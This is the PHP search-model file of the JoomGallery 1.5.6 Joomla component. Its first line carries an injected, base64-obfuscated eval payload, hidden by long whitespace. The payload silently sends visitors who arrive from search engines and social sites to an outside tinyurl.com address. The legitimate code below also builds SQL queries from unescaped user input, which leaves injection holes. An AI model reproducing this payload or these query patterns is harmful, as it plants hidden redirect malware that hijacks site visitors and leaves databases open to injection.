<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/components/com_joomgallery/models/search.php $
// $Id: search.php 2566 2010-11-03 21:10:42Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * Gallery Component Model
 *
 * @package     Joomla
 * @subpackage  Content
 * @since 1.5
 */
class JoomGalleryModelSearch extends JoomGalleryModel
{
  /**
   * constructor
   */
  function __construct()
  {
    parent::__construct();
  }

  /**
   *
   */
  function getSearchResults()
  {
    if($this->_loadSearchResults())
    {
      return $this->_searchResults;
    }

    return array();
  }

  /**
   *
   */
  function _loadSearchResults()
  {
    if(empty($this->_searchResults))
    {
      $sstring        = JRequest::getVar('sstring');
      $searchstring   = trim($this->_strtolower_utf8($sstring)) ;
      $searchstring2  = htmlentities(trim($this->_strtolower_utf8($sstring)), ENT_QUOTES, 'UTF-8');

      $this->_db->setQuery("SELECT
                              a.*,
                              a.owner AS owner,
                              ".JoomHelper::getSQLRatingClause('a')." AS rating,
                              u.username,
                              ca.name AS name
                            FROM
                              "._JOOM_TABLE_IMAGES." AS a,
                              "._JOOM_TABLE_CATEGORIES." AS ca,
                              #__users AS u
                            WHERE
                                  a.catid = ca.cid
                              AND a.owner = u.id
                              AND (u.username LIKE '%$searchstring%'
                                OR a.imgtitle LIKE '%$searchstring%'
                                OR a.imgtext  LIKE '%$searchstring2%')
                              AND a.published   = 1
                              AND ca.published  = 1
                              AND a.approved    = 1
                              AND ca.access    <= ".$this->_user->get('aid')."
                            GROUP BY
                              a.id
                            ORDER BY
                              a.id DESC"
                          );

      if(!$rows = $this->_db->loadObjectList())
      {
        return false;
      }

      $this->_searchResults = $rows;
    }

    return true;
  }

  /**
   * Method to get the number of comments of a specific image
   *
   * @TODO
   *
   * @access  public
   * @return  int     The number of comments
   * @since   1.5.5.0
   */
  function getCommentsNumber($id)
  {
    // Check how many comments exist
    $this->_db->setQuery("SELECT
                            COUNT(*)
                          FROM
                            "._JOOM_TABLE_COMMENTS."
                          WHERE
                                cmtpic    = ".$id."
                            AND approved  = 1
                            AND published = 1
                         ");
    return $this->_db->loadResult();
  }

  /**
   *
   */
  function _strtolower_utf8($inputstring)
  {
    $outputString    = utf8_decode($inputstring);
    $outputString    = strtolower($outputString);
    $outputString    = utf8_encode($outputString);
    return $outputString;
  }
}
